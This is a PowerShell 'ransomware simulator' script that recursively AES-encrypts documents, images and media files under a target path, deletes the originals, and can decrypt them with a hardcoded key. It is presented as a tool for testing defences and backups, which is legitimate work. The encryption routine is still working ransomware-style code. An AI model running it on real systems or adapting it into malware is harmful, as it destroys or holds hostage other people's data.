<#

.SYNOPSIS
    Rware Simulator using AES to recursively encrypt or decrypt files at a given path

.DESCRIPTION
    This script is intended to be used to test your defenses and backups against ransomware in a controlled environment. You can encrypt fake data for
your simulation, but you also have the option to decrypt the files with the same script if you need to.

.EXAMPLE
    .\Sim.ps1 -mode encr
    or
    .\Sim.ps1 -mode decr

.PARAMETER Target File Path
    This optional parameter specifies the path that the recursive encryption will start in. A default path is provided.
 
.PARAMETER File Extension
    This optional parameter defines the extension that will be added to the encrypted files once attacked. A default extension is provided.

.PARAMETER Encryption key
    This optional parameter is the plain-text AES encryption key used for both encryption and decryption. A default key is provided. 

.NOTES
    This script uses the FileCryptopgraphy module from Tyler Siegrist - https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d

#>

# Define parameters and their defaults
param([string]$Mode,
      [string]$TargetPath = "C:\Users\kali\Downloads\tesing",
      [string]$Extension = ".encrypted",
      [string]$Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
)

# Define target file types
$TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'

# Import FileCryptography module
Import-Module "C:\Users\kali\Downloads\Badstuff\RanSim-main\RanSim-main\FileCryptography.psm1"

if ($mode -eq "encr") {
    # Gather all files from the target path and its subdirectories
    $FilesToEncr = get-childitem -path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -force | Where-Object { ! $_.PSIsContainer }
    Write-Host $FilesToEncr
$NumFiles = $FilesToEncr.length

    # Encr the files
    foreach ($file in $FilesToEncr)
    {
        Write-Host "Encr $file"
        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
    }
    Write-Host "Encr $NumFiles files." | Start-Sleep -Milliseconds 10000
}

elseif ($mode -eq "decr") {
    # Gather all files from the target path and its subdirectories
    $FilestoDecr = get-childitem -path $TargetPath\* -Include *$Extension -Recurse -force | Where-Object { ! $_.PSIsContainer }

    # Encr the files
    foreach ($file in $FilestoDecr)
    {
        Write-Host "Decr $file"
        Unprotect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension  -RemoveSource
    }
} 

else {
    write-host "ERROR: must choose a mode (encr or decr). Example usage: .\Sim.ps1 -mode encr"
}
exit 
